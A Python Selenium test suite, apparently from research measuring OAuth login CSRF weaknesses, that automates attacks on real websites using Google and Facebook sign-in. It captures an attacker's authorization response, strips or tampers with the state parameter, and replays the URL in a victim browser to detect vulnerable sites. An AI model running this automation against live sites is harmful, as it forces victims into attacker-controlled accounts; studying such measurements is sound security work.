import unittest
from selenium.webdriver.support import expected_conditions as ec
from domain import GoogleDomains, FacebookDomains
from parameterized import parameterized
from provider import Google, Facebook
from driver import Driver
from utility.data import Data, Attacker, Victim
from utility.facebook import is_facebook_login
from utility.google import is_google_login
from utility.utility import get_parameter, replace_parameter, remove_parameter, get_random_permutation
from utility.google import get_flow, is_code_flow, is_google_login
import HtmlTestRunner
import time
import logging
import random

save_data = True
headless_mode = True


# Return data for parameterized
def test_domains(domains):
    return [(x.get("domain"), x) for x in domains]


# Base class for the tests
class TestBase(unittest.TestCase):

    def setUp(self):
        self.domain = None
        self.test_name = None
        self.driver = Driver(headless=headless_mode)
        #logging.info("creating driver")

    def tearDown(self):
        #logging.info("Let's keep the driver for ever!")
        self.driver.quit()
        #time.sleep(400)

'''
# Class containing all the Facebook tests
class FacebookTest(TestBase):

    def setUp(self):
        super().setUp()
        self.database = FacebookDomains()
        self.facebook = Facebook(self.driver)

    def tearDown(self):
        self.database.close()
        self.driver.save_requests(self.test_name, f"{Attacker.name}_{self.domain['domain']}")
        super().tearDown()

    # Check if the authorization page is reached
    def check_authorization(self):
        time.sleep(Data.MEDIUM_TIME)
        authorization_url = self.driver.current_url
        page_reached = is_facebook_login(authorization_url)
        self.assertTrue(page_reached, msg=f"Authorization page not reached")
        if save_data:
            self.database.save_value(self.domain, "authorization_url", authorization_url)

    # Check the type of OAuth flow implemented by the domain
    def check_oauth_flow(self):
        url = self.driver.current_url
        flow = get_flow(url)
        code_flow = is_code_flow(flow)
        if save_data:
            self.database.save_value(self.domain, "oauth_flow", flow)
        self.assertTrue(code_flow, msg=f"No Code flow [{flow}]")

    # Reach the login page and check the OAuth flow
    def check_login(self):
        self.facebook.reach_login(self.domain)
        self.check_authorization()
        self.check_oauth_flow()

    # Do the login and perform the authorization
    def authorize(self, user, facebook):
        facebook.cookie_login(user.cookies)
        facebook.reach_login(self.domain)

        # Perform the authorization step if needed
        error = facebook.authorize(user.password)
        if save_data:
            self.database.save_value(self.domain, "authorization_error", error)
        self.assertFalse(bool(error), msg=f"Authorization error: {error}")

    # Perform the Facebook login for the domain
    def login(self, user):
        self.authorize(user, self.facebook)

        # Reach the marker page
        error = self.facebook.reach_marker_page(self.domain)
        if save_data:
            self.driver.save_data(f"{user.name}_login", self.domain)
        self.assertIsNone(error, msg=error)

        # Return the marker found in the landing page
        marker = self.database.get_marker(self.driver.page_source, user.markers)
        if save_data:
            self.database.save_value(self.domain, f"{user.name}_marker", marker)
        self.assertIsNotNone(marker, msg=f"{user.name} marker not found")

    # The victim login performed during the attack
    def attack_login(self, facebook):
        self.authorize(Victim, facebook)

        # Reach the marker page
        error = facebook.reach_marker_page(self.domain)
        self.assertIsNone(error, msg=error)

        # Return the marker found in the landing page
        marker = self.database.get_marker(facebook.driver.page_source, Victim.markers)
        self.assertIsNotNone(marker, msg=f"{Victim.name} marker not found")

    # Get a valid authorization response from the IdP
    def get_authorization_response(self):
        # Enable the redirect-blocker extension
        self.driver.install_extension()

        # Authorize and get the authorization response
        self.authorize(Attacker, self.facebook)
        response = self.facebook.get_authorization_response()
        if save_data:
            self.database.save_value(self.domain, f"authorization_response_{self.test_name}", response)
        self.assertIsNotNone(response, msg="Missing authorization response")
        return response

    # Run the attack in a diffent browser session
    def attack(self, url):
        driver = Driver(headless=headless_mode)
        try:
            if save_data:
                self.database.save_value(self.domain, f"vulnerable_{self.test_name}", None)
            facebook = Facebook(driver)

            # Visit the website before the attack
            if "b" in self.test_name:
                facebook.reach_login(self.domain)
                facebook.switch_back_window(forced=True)

            # Do the login with the victim before the attack
            if "c" in self.test_name:
                self.attack_login(facebook)

            facebook.driver.get(url)

            # Reach the marker page
            error = facebook.reach_marker_page(self.domain)
            if save_data:
                driver.save_data(self.test_name, self.domain)
                self.database.save_value(self.domain, f"vulnerable_{self.test_name}", False)
            self.assertIsNone(error, msg=error)

            # Return the marker found in the landing page
            marker = self.database.get_marker(driver.page_source, Attacker.markers)
            if save_data:
                self.database.save_value(self.domain, f"vulnerable_{self.test_name}", bool(marker))
            self.assertIsNotNone(marker, msg="Marker not found")
        finally:
            driver.save_requests(self.test_name, f"{Victim.name}_{self.domain['domain']}")
            driver.quit()

    # Check if the marker information is visible without a login
    @parameterized.expand(test_domains(FacebookDomains().get_marker_url()))
    def _test_marker_information(self, _, domain):
        # Reach the marker page
        error = self.facebook.reach_marker_page(domain)
        self.assertIsNone(error, msg=error)
        # Return the marker found in the landing page
        marker = self.database.get_marker(self.driver.page_source, Attacker.markers)
        self.assertIsNone(marker, msg="Marker found")

    @parameterized.expand(
        test_domains(FacebookDomains().get_all()),
        #test_domains([FacebookDomains().get_domain("thechive.com")]),
        skip_on_empty=True
    )
    def _test_check_login(self, _, domain):
        """Reach the login page and check the OAuth flow"""
        self.domain = domain
        self.test_name = "check_login"
        self.check_login()

    @parameterized.expand(
        # test_domains(FacebookDomains().get_login_domains()),
        test_domains([FacebookDomains().get_domain("discogs.com")]),
        # test_domains(FacebookDomains().get_attack_domains()),
        # test_domains(FacebookDomains().get_login(Victim)),
        skip_on_empty=True
    )
    def _test_login(self, _, domain):
        """Perform the Facebook login and check the presence of markers"""
        self.domain = domain
        user = Attacker
        self.test_name = f"{user.name}_login"
        self.login(user)

    @parameterized.expand(
        # test_domains(FacebookDomains().get_attack_incomplete("2v", with_state=True)),
        test_domains(FacebookDomains().get_attack_domains(state=True)),
        # test_domains([FacebookDomains().get_domain("admin.podbean.com")]),
        skip_on_empty=True
    )
    def test_empty_state_attack(self, _, domain):
        """Login CSRF with an empty state parameter"""
        self.domain = domain
        self.test_name = "1a"
        # Get a valid authorization response from the IdP
        authorization_url = self.get_authorization_response()
        # Remove the value of the state parameter from the URL
        authorization_url = replace_parameter(authorization_url, "state", "")
        self.attack(authorization_url)

    @parameterized.expand(
        # test_domains([FacebookDomains().get_domain("admin.podbean.com")]),
        # test_domains(FacebookDomains().get_attack_incomplete("3", with_state=True)),
        test_domains(FacebookDomains().get_attack_domains(state=True)),
        skip_on_empty=True
    )
    def _test_random_state_attack(self, _, domain):
        """Login CSRF with a random fake state parameter"""
        self.domain = domain
        self.test_name = "2a"
        # Get a valid authorization response from the IdP
        authorization_url = self.get_authorization_response()
        # Change the value of the state parameter
        state = get_parameter(authorization_url, "state")
        new_state = get_random_permutation(state)
        authorization_url = replace_parameter(authorization_url, "state", new_state)
        self.database.save_value(domain, "state", state)
        self.database.save_value(domain, "new_state", new_state)
        self.attack(authorization_url)

    @parameterized.expand(
        # Try the attack for all the domains with a valid login and a state
        # test_domains(FacebookDomains().get_attack_incomplete("1", with_state=False)),
        test_domains(FacebookDomains().get_attack_domains(state=True)),
        # test_domains([FacebookDomains().get_domain("forumcommunity.net")]),
        skip_on_empty=True
    )
    def _test_attacker_state_attack(self, _, domain):
        """Login CSRF with a valid attacker state parameter"""
        self.domain = domain
        self.test_name = "3b"
        # Get a valid authorization response from the IdP
        authorization_url = self.get_authorization_response()
        # Open the URL in another browser session and search markers
        self.attack(authorization_url)

    @parameterized.expand(
       
            # test_domains(FacebookDomains().get_attack_incomplete("2v", with_state=True)),
        test_domains(FacebookDomains().get_attack_domains(state=True)),
        # test_domains([FacebookDomains().get_domain("9gag.com")]),
        skip_on_empty=True
    )
    def _test_lenient_state_attack(self, _, domain):
        """Login CSRF removing the state parameter"""
        self.domain = domain
        self.test_name = "4a"
        # Get a valid authorization response from the IdP
        authorization_url = self.get_authorization_response()
        # Remove the state parameter from the URL
        authorization_url = remove_parameter(authorization_url, "state")
  i
  self.attack(authorization_url)
'''
# Class containing all the Google tests
class GoogleTest(TestBase):

    def setUp(self):
        super().setUp()
        self.database = GoogleDomains()
        self.google = Google(self.driver)

    def tearDown(self):
        self.database.close()
        self.driver.save_requests(self.test_name, f"{Attacker.name}_{self.domain['domain']}")
        super().tearDown()

    # Check if the authorization page is reached
    def check_authorization(self):
        time.sleep(Data.MEDIUM_TIME)
        authorization_url = self.driver.current_url
        page_reached = is_google_login(authorization_url)
        self.assertTrue(page_reached, msg=f"Authorization page not reached")
        if save_data:
            self.database.save_value(self.domain, "authorization_url", authorization_url)

    # Check the type of OAuth flow implemented by the domain
    def check_oauth_flow(self):
        url = self.driver.current_url
        flow = get_flow(url)
        code_flow = is_code_flow(flow)
        if save_data:
            self.database.save_value(self.domain, "oauth_flow", flow)
        self.assertTrue(code_flow, msg=f"No Code flow [{flow}]")

    # Reach the login page and check the OAuth flow
    def check_login(self):
        self.google.reach_login(self.domain)
        self.check_authorization()
        self.check_oauth_flow()

    # Do the login and perform the authorization
    def authorize(self, user, google):
        #google.cookie_login(user.cookies)

        google.reach_login(self.domain)
        google.login(user.username, user.password)
        #self.google.switch_window()
        #self.driver.switch_to.window(self.driver.main_window)
        self.google.switch_back_window(forced=False)
        google.driver.save_login_cookies(self.domain['domain'])

        '''
        # Perform the authorization step if needed
        error = google.authorize(user.password)
        if save_data:
            self.database.save_value(self.domain, "authorization_error", error)
        self.assertFalse(bool(error), msg=f"Authorization error: {error}")
        '''
    # Perform the Facebook login for the domain
    def login(self, user):
        self.authorize(user, self.google)

        # Reach the marker page
        error = self.google.reach_marker_page(self.domain)
        if save_data:
            self.driver.save_data(f"{user.name}_login", self.domain)
        self.assertIsNone(error, msg=error)

        # Return the marker found in the landing page
        marker = self.database.get_marker(self.driver.page_source, user.markers)
        if save_data:
            self.database.save_value(self.domain, f"{user.name}_marker", marker)
        self.assertIsNotNone(marker, msg=f"{user.name} marker not found")



    # The victim login performed during the attack
    def attack_login(self, google):
        self.authorize(Victim, google)

        # Reach the marker page
        error = google.reach_marker_page(self.domain)
        self.assertIsNone(error, msg=error)

        # Return the marker found in the landing page
        marker = self.database.get_marker(google.driver.page_source, Victim.markers)
        self.assertIsNotNone(marker, msg=f"{Victim.name} marker not found")

    # Get a valid authorization response from the IdP
    def get_authorization_response(self):
        # Enable the redirect-blocker extension
        self.driver.install_extension()

        # Authorize and get the authorization response
        self.authorize(Attacker, self.google)
        response = self.google.get_authorization_response()
        if save_data:
            self.database.save_value(self.domain, f"authorization_response_{self.test_name}", response)
        self.assertIsNotNone(response, msg="Missing authorization response")
        return response

    # Run the attack in a diffent browser session
    def attack(self, url):
        driver = Driver(headless=headless_mode)
        try:
            if save_data:
                self.database.save_value(self.domain, f"vulnerable_{self.test_name}", None)
            google = Google(driver)

            # Visit the website before the attack
            if "b" in self.test_name:
                google.reach_login(self.domain)
                google.switch_back_window(forced=True)

            # Do the login with the victim before the attack
            if "c" in self.test_name:
                self.attack_login(google)

            google.driver.get(url)

            # Reach the marker page
            error = google.reach_marker_page(self.domain)
            if save_data:
                driver.save_data(self.test_name, self.domain)
                self.database.save_value(self.domain, f"vulnerable_{self.test_name}", False)
            self.assertIsNone(error, msg=error)

            # Return the marker found in the landing page
            marker = self.database.get_marker(driver.page_source, Attacker.markers)
            if save_data:
                self.database.save_value(self.domain, f"vulnerable_{self.test_name}", bool(marker))
            self.assertIsNotNone(marker, msg="Marker not found")
        finally:
            driver.save_requests(self.test_name, f"{Victim.name}_{self.domain['domain']}")
            driver.quit()

    '''
    # Check if the marker information is visible without a login
    @parameterized.expand(test_domains(GoogleDomains().get_marker_url()))
    def _test_marker_information(self, _, domain):
        # Reach the marker page
        error = self.google.reach_marker_page(domain)
        self.assertIsNone(error, msg=error)
        # Return the marker found in the landing page
        marker = self.database.get_marker(self.driver.page_source, Attacker.markers)
        self.assertIsNone(marker, msg="Marker found")
    '''
    @parameterized.expand(
        test_domains(GoogleDomains().get_all()),
        #test_domains([GoogleDomains().get_domain("thechive.com")]),
        skip_on_empty=True
    )
    def _test_check_login(self, _, domain):
        #Reach the login page and check the OAuth flow
        self.domain = domain
        self.test_name = "check_login"
        self.check_login()

    @parameterized.expand(
        test_domains(GoogleDomains().get_login_domains()),
        #test_domains([GoogleDomains().get_domain("ticktick.com")]),
        # test_domains(FacebookDomains().get_attack_domains()),seasonvar.ru
        # test_domains(FacebookDomains().get_login(Victim)),
        skip_on_empty=True
    )
    def _test_login(self, _, domain):
        """Perform the Facebook login and check the presence of markers"""
        self.domain = domain
        user = Victim
        self.test_name = f"{user.name}_login"
        self.login(user)

    @parameterized.expand(
        # Try the attack for all the domains with a valid login and no state
        test_domains(GoogleDomains().get_attack_domains(state=False)),
        skip_on_empty=True
    )
    def _test_no_state_attack(self, _, domain):
        """Login CSRF when a state parameter is missing"""
        self.domain = domain
        self.test_name = "0a"
        # Get a valid authorization response from the IdP
        authorization_url = self.get_authorization_response()
        # Open the URL in another browser session and search markers
        self.attack(authorization_url)
    
    @parameterized.expand(
        # test_domains(FacebookDomains().get_attack_incomplete("2v", with_state=True)),
        test_domains(GoogleDomains().get_attack_domains(state=True)),
        # test_domains([FacebookDomains().get_domain("admin.podbean.com")]),
        skip_on_empty=True
    )
    def _test_empty_state_attack(self, _, domain):
        """Login CSRF with an empty state parameter"""
        self.domain = domain
        self.test_name = "1a"
        # Get a valid authorization response from the IdP
        authorization_url = self.get_authorization_response()
        # Remove the value of the state parameter from the URL
        authorization_url = replace_parameter(authorization_url, "state", "")
        self.attack(authorization_url)
    
    @parameterized.expand(
        # test_domains([FacebookDomains().get_domain("admin.podbean.com")]),
        # test_domains(FacebookDomains().get_attack_incomplete("3", with_state=True)),
        test_domains(GoogleDomains().get_attack_domains(state=True)),
        skip_on_empty=True
    )
    def _test_random_state_attack(self, _, domain):
        """Login CSRF with a random fake state parameter"""
        self.domain = domain
        self.test_name = "2b"
        # Get a valid authorization response from the IdP
        authorization_url = self.get_authorization_response()
        # Change the value of the state parameter
        state = get_parameter(authorization_url, "state")
        new_state = get_random_permutation(state)
        authorization_url = replace_parameter(authorization_url, "state", new_state)
        self.database.save_value(domain, "state", state)
        self.database.save_value(domain, "new_state", new_state)
        self.attack(authorization_url)

    @parameterized.expand(
        # Try the attack for all the domains with a valid login and a state
        # test_domains(FacebookDomains().get_attack_incomplete("1", with_state=False)),
        test_domains(GoogleDomains().get_attack_domains(state=True)),
        # test_domains([FacebookDomains().get_domain("forumcommunity.net")]),
        skip_on_empty=True
    )
    def _test_attacker_state_attack(self, _, domain):
        """Login CSRF with a valid attacker state parameter"""
        self.domain = domain
        self.test_name = "3a"
        # Get a valid authorization response from the IdP
        authorization_url = self.get_authorization_response()
        # Open the URL in another browser session and search markers
        self.attack(authorization_url)

    @parameterized.expand(
        # test_domains(FacebookDomains().get_attack_incomplete("2v", with_state=True)),
        test_domains(GoogleDomains().get_attack_domains(state=True)),
        # test_domains([FacebookDomains().get_domain("9gag.com")]),
        skip_on_empty=True
    )
    def test_lenient_state_attack(self, _, domain):
        """Login CSRF removing the state parameter"""
        self.domain = domain
        self.test_name = "4a"
        # Get a valid authorization response from the IdP
        authorization_url = self.get_authorization_response()
        # Remove the state parameter from the URL
        authorization_url = remove_parameter(authorization_url, "state")
        self.attack(authorization_url)

# Save the google login cookies
def get_login_cookies(user):
    driver = Driver()
    google = Google(driver)
    google.save_login_cookies(user.cookies, user.username, user.password)
    driver.quit()


if __name__ == "__main__":
    #get_login_cookies(Attacker)
    #get_login_cookies(Victim)
    unittest.main(testRunner=HtmlTestRunner.HTMLTestRunner(output="results/reports"))

